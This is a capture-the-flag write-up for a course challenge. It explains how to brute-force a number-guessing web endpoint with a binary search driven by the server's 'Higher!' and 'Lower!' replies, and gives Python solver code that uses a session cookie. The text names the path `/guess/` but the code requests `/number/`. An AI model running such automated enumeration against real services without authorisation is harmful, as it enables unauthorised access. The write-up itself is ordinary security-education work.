# Challenge `Guess a BIG number` Writeup

- Vulnerability:
    - Endpoint is vulnerable to brute-force attack

- Where:
    - `/guess/<number>` endpoint

- Impact:
    - Allows to find the server guess by enumeration

## Steps to reproduce

Since the number generated by the server is random, we need to brute-force it. Additionally we know that the number is between 0 and 1000000 and also that the server will return `Higher!` or `Lower!` if the number is not correct.

With this informaton we can do a brute-force attack to find the number using binary search to reduce the number of requests.

Finally, since the server's session is associated with a cookie, all requests must be sent with it.

### Step 1: Get the cookie
Firstly, we need to send a request to `/` to get the cookie.

```python
import requests

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23052"
s = requests.Session()
s.get(link)
```

### Step 2: Guess the number using binary search

```python
low = 0
high = 1000000

while True:
    mid = (low + high) // 2
    r = s.get(link + "/number/" + str(mid))

    if "Higher!" in r.text:
        low = mid + 1
    elif "Lower!" in r.text:
        high = mid - 1
    elif "SSof" in r.text:
        print(r.text)
        break
```

With this we can reduce a lot the number of requests and the console will display the flag when the number is found.

## Implementation

The full implementation can be found [here](guess-BIG.py).
